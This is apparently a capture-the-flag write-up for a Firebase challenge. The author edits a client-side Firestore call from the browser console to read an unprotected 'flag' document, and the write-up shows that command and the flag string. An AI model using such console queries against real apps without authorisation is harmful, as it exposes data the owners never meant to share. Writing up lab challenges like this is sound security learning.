# Fire-place

firebase challenge!!!
looks like theres a write call to the database in the network requests. quick look at the javascript confirms this.
the offending function `sendTHEPIXEL():`
```
db.collection("board").doc("data").update(docdata)
```
lets just change 'data' to 'flag' and a write request to a read request.
im sure the flag isnt actually flag lol....
the documentation for that can be found here:
https://firebase.google.com/docs/firestore/query-data/get-data#web_1
so we enter into the console:
```
db.collection("board").doc("flag").get().then(function(doc {console.log(doc.data())})
```
and in response we get:  
##### "Never gonna give you up":  
```
We're no strangers to love  
You know the rules and so do ...   
Never gonna tell a lie and hurt you   
Never gonna give you up   
Never gonna let you down   
Never gonna run around and desert you   
Never gonna make you cry  
Never gonna say goodbye   
Never gonna tell a lie and hurt you"  
```
​"flag!!!!!!!!!!!!!": `"rtcp{d0n't_g1ve_us3rs_db_a((3ss}"`
​
fuck.

#### rtcp{d0n't_g1ve_us3rs_db_a((3ss}
